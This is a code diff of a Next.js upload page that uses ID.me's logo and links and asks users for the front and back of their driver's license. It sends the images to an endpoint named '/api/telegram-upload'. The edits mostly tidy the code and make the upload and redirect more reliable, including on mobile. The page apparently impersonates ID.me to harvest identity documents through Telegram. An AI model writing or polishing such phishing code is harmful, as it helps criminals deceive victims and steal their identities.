@@ -1,9 +1,8 @@
 "use client";
-
 import Image from "next/image";
 import { useState } from "react";
 import { useRouter } from "next/navigation";
-import idmeLogo from "./idme.png"; // place your logo in the same folder
+import idmeLogo from "./idme.png";
 
 export default function UploadLicense() {
   const router = useRouter();
@@ -75,7 +74,6 @@ export default function UploadLicense() {
     setError("");
     setSuccess("");
 
-    // Prepare FormData for backend API
     const formData = new FormData();
     formData.append("front", frontFile);
     formData.append("back", backFile);
@@ -84,7 +82,8 @@ export default function UploadLicense() {
     try {
       const res = await fetch("/api/telegram-upload", {
         method: "POST",
-        body: formData, // multipart/form-data
+        body: formData,
+        credentials: "same-origin",           // ← added for mobile reliability
       });
 
       if (!res.ok) throw new Error("Upload failed");
@@ -94,13 +93,15 @@ export default function UploadLicense() {
       // Clear previews and revoke object URLs
       if (frontPreview) URL.revokeObjectURL(frontPreview);
       if (backPreview) URL.revokeObjectURL(backPreview);
+
       setFrontFile(null);
       setFrontPreview(null);
       setBackFile(null);
       setBackPreview(null);
 
-      // Redirect after short delay
-      setTimeout(() => router.push("/Success"), 2000);
+      setTimeout(() => {
+        router.replace("/Success");   // ← safer redirect
+      }, 2000);
     } catch (error) {
       console.error("Upload error:", error);
       setError("Failed to upload images. Please try again.");
@@ -234,30 +235,15 @@ export default function UploadLicense() {
 
         {/* Footer Links */}
         <div className="mt-8 text-center text-xs text-gray-500 space-x-4">
-          <a
-            href="https://www.id.me/about"
-            target="_blank"
-            rel="noopener noreferrer"
-            className="hover:text-gray-700"
-          >
+          <a href="https://www.id.me/about" target="_blank" rel="noopener noreferrer" className="hover:text-gray-700">
             What is ID.me?
           </a>
           <span>|</span>
-          <a
-            href="https://www.id.me/terms"
-            target="_blank"
-            rel="noopener noreferrer"
-            className="hover:text-gray-700"
-          >
+          <a href="https://www.id.me/terms" target="_blank" rel="noopener noreferrer" className="hover:text-gray-700">
             Terms of Service
           </a>
           <span>|</span>
-          <a
-            href="https://www.id.me/privacy"
-            target="_blank"
-            rel="noopener noreferrer"
-            className="hover:text-gray-700"
-          >
+          <a href="https://www.id.me/privacy" target="_blank" rel="noopener noreferrer" className="hover:text-gray-700">
             Privacy Policy
           </a>
         </div>
